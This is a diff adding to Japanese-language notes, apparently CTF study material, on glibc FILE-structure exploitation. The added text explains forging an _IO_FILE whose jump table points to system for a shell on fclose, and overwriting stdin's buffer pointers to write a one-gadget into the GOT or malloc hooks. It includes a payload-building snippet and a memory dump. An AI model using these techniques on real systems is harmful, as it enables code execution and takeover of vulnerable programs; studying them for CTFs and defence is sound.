@@ -121,7 +121,9 @@ _IO_jump_tのメモリダンプ
 ```
 
 # Exploit
-* fpを上書きできる場合、_IO_FILEを偽装し、_IO_jump_tにsystem関数を仕込んでおくにより、fclose(fp)などが呼ばれた時にshellを取れる
+* fpを上書きできる場合、_IO_FILEを偽装し、_IO_jump_tに任意の関数を仕込んでおくにより、fclose(fp)などが呼ばれた時にその関数を実行できる
+
+下の例では、system("/bin/sh")が実行される。なお_IO_FILEのflagsに第一引数（この場合は"/bin/sh¥0"）をセットしておくことが可能。
 
 ```
     # fake _IO_FILE
@@ -133,4 +135,25 @@ _IO_jump_tのメモリダンプ
     # fake _IO_file_jumps
     buf += p(0)*2
     buf += p(system)*19
+```
+
+* stdinの_IO_buf_baseと_IO_buf_endを上書きできる場合、scanf/fgets/gets等の書き込み先をコントロールできる。
+
+下の例だと0x62000に任意のデータを書き込めるので、GOTやfree_hook/malloc_hookにone gadget rceなどを仕込むことができる。
+
+```
+0x7ffff7dd4640 <_IO_2_1_stdin_>:	0x00000000fbad208b	0x00007ffff7dd46c3
+0x7ffff7dd4650 <_IO_2_1_stdin_+16>:	0x00007ffff7dd46c3	0x00007ffff7dd46c3
+0x7ffff7dd4660 <_IO_2_1_stdin_+32>:	0x00007ffff7dd46c3	0x00007ffff7dd46c3
+0x7ffff7dd4670 <_IO_2_1_stdin_+48>:	0x00007ffff7dd46c3	0x0000000000602000 _IO_write_end / _IO_buf_base
+0x7ffff7dd4680 <_IO_2_1_stdin_+64>:	0x0000000000602100	0x0000000000000000 _IO_buf_end / _IO_save_base
+0x7ffff7dd4690 <_IO_2_1_stdin_+80>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd46a0 <_IO_2_1_stdin_+96>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd46b0 <_IO_2_1_stdin_+112>:	0x0000000000000000	0xffffffffffffffff
+0x7ffff7dd46c0 <_IO_2_1_stdin_+128>:	0x0000000000000000	0x00007ffff7dd59f0
+0x7ffff7dd46d0 <_IO_2_1_stdin_+144>:	0xffffffffffffffff	0x0000000000000000
+0x7ffff7dd46e0 <_IO_2_1_stdin_+160>:	0x00007ffff7dd4720	0x0000000000000000
+0x7ffff7dd46f0 <_IO_2_1_stdin_+176>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd4700 <_IO_2_1_stdin_+192>:	0x0000000000000000	0x0000000000000000
+0x7ffff7dd4710 <_IO_2_1_stdin_+208>:	0x0000000000000000	0x00007ffff7dd26a0
 ```
